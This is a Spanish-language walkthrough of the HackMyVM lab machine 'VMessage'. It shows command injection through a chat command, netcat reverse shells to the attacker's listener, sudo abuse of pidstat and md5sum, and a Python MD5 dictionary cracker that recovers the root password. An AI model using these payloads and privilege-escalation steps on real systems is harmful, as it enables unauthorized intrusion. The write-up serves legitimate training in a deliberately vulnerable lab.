---
icon: flag
---

# VMessage HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 11:48 EDT
Nmap scan report for 192.168.5.56
Host is up (0.0024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 62:8e:95:58:1e:ee:94:d1:56:0e:e5:51:f5:45:38:43 (RSA)
|   256 45:a8:7e:56:7f:df:b0:83:65:6c:88:68:19:a4:86:6c (ECDSA)
|_  256 bc:54:24:a6:0a:8b:6d:34:dc:a6:ab:80:98:ee:1f:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
| http-title: Login
|_Requested resource was /login?next=%2F
|_http-server-header: Apache/2.4.54 (Debian)
MAC Address: 08:00:27:60:6B:7C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.37 seconds
```

Veremos que hay un puerto `80` que aloja una pagina web, si entramos dentro de dicho puerto veremos una pagina web con un `login`, pero no tendremos ningunas credenciales, por lo que vamos a registrarnos, una vez echo esto, nos llevara a una `home` en la que podremos escribir mensajes como si fura un `foro`, el primer mensaje que veremos sera el siguiente:

```
Hi, This is finally working. I spent a month on this messaging system I hope there are no bugs in it. use !mpstat to get the status of the server.
```

Vemos algo bastante intersante, nos comenta que utilicemos el comando `!mpstat` para obtener el estado del servidor, por lo que vamos a ejecutarlo a ver que vemos.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-07 181020.png" alt=""><figcaption></figcaption></figure>

## Escalate user www-data

Veremos que ha funcionado, vamos a probar una vulnerabilidad muy simple que seria el echo de concatenar comandos con `;` vamos a probarlo de esta forma.

```shell
!mpstat; id
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-07 181133.png" alt=""><figcaption></figcaption></figure>

Vemos que se esta ejecutando de forma correcta, por lo que vamos a probar a generar una `reverse shell` de esta forma.

```shell
!mpstat; nc <IP> <PORT> -e /bin/bash
```

Antes de ejecutarlo, vamos a ponernos a la escucha de esta forma:

```shell
nc -lvnp <PORT>
```

Ahora estando a la escucha vamos a ejecutar lo anterior, si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.56] 50390
whoami
www-data
```

Veremos que ha funcioando, por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user messagemaster

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on MSG:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on MSG:
    (messagemaster) NOPASSWD: /bin/pidstat
```

Vemos que podemos ejecutar el binario `pidstat` como el usuario `messagemaster`, por lo que haremos lo siguiente:

```shell
COMMAND="nc <IP> <PORT> -e /bin/bash"
sudo -u messagemaster pidstat -e $COMMAND
```

Antes de ejecutarlo nos pondremos a la escucha en otra ventana de terminal de nuestro `host`.

```shell
nc -lvnp <PORT>
```

Ahora si lo ejecutamos veremos lo siguiente:

```
Linux 5.10.0-19-amd64 (MSG)     07/07/25        _x86_64_        (1 CPU)

16:19:20      UID       PID    %usr %system  %guest   %wait    %CPU   CPU  Command
16:19:20     1000       893    0.00    0.00    0.00    0.00    0.00     0  pidstat
```

Y si volvemos a donde tenemos la escucha veremos esto:

```
listening on [any] 7755 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.56] 50395
whoami
messagemaster
```

Veremos que ha funcionado, por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Por lo que vamos a leer la `flag` del usuario.

> User.txt

```
ea86091a17126fe48a83c1b8d13d60ab
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for messagemaster on MSG:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User messagemaster may run the following commands on MSG:
    (ALL) NOPASSWD: /bin/md5sum
```

Vemos que podemos ejecutar el binario `md5sum` como el usuario `root` podemos aprovechar esta vulnerabilidad para calcular el `hash` `MD5` de cualquier archivo del sistema como `root` por lo que vamos a investigar a ver cual nos puede interesar.

Si investigamos un poco veremos el siguiente archivo en esta ruta.

```shell
ls -la /var/www
```

Info:

```
total 16
drwxr-xr-x  3 root     root     4096 Nov 21  2022 .
drwxr-xr-x 12 root     root     4096 Nov 20  2022 ..
-rw-r-----  1 root     root       12 Nov 21  2022 ROOTPASS
drwxrwxr--  5 www-data www-data 4096 Nov 18  2022 html
```

Veremos que hay un archivo llamado `ROOTPASS` por lo que vamos a calcular su `md5` de esta forma.

```shell
sudo md5sum /var/www/ROOTPASS
```

Info:

```
85c73111b30f9ede8504bb4a4b682f48  /var/www/ROOTPASS
```

Ahora desde nuestro `host` vamos a crackear dicho `hash` para poder obtener lo que se supone que es el `password` del usuario `root`.

> crack\_md5.py

```python
#!/usr/bin/env python3
import hashlib
import sys
import os

def main():
    if len(sys.argv) != 3:
        print(f"\nUso: {sys.argv[0]} <hash_md5> <ruta_diccionario>\n")
        sys.exit(1)

    target_md5 = sys.argv[1].strip().lower()
    diccionario = sys.argv[2]

    if not os.path.isfile(diccionario):
        print(f"\n[ERROR] El archivo '{diccionario}' no existe.\n")
        sys.exit(1)

    print(f"\n[*] Buscando contraseña para el hash MD5:\n    {target_md5}")
    print(f"[*] Usando diccionario:\n    {diccionario}\n")

    with open(diccionario, encoding="latin-1", errors="ignore") as wordlist:
        for idx, password in enumerate(wordlist, 1):
            password = password.strip()
            computed_hash = hashlib.md5((password + "\n").encode()).hexdigest()

            if computed_hash == target_md5:
                print(f"\n[✔] ¡Contraseña encontrada en la línea {idx}!: {password}\n")
                break
        else:
            print("\n[✘] No se encontró la contraseña en el diccionario.\n")

if __name__ == "__main__":
    main()
```

Lo guardamos y lo ejecutamos de esta forma:

```shell
python3 crack_md5.py 85c73111b30f9ede8504bb4a4b682f48 <WORDLIST>
```

Info:

```
[*] Buscando contraseña para el hash MD5:
    85c73111b30f9ede8504bb4a4b682f48
[*] Usando diccionario:
    /usr/share/wordlists/rockyou.txt


[✔] ¡Contraseña encontrada en la línea 10827010!: Message5687
```

Veremos que ha funcionado y nos ha encontrado la supuesta contraseña de `root`, por lo que vamos a probarla de esta forma en la maquina victima.

```shell
su root
```

Metemos como contraseña `Message5687` y veremos que seremos `root`, por lo que leeremos la `flag` de `root`.

> Root.txt

```
a59b23da18102898b854f3034f8b8b0f
```
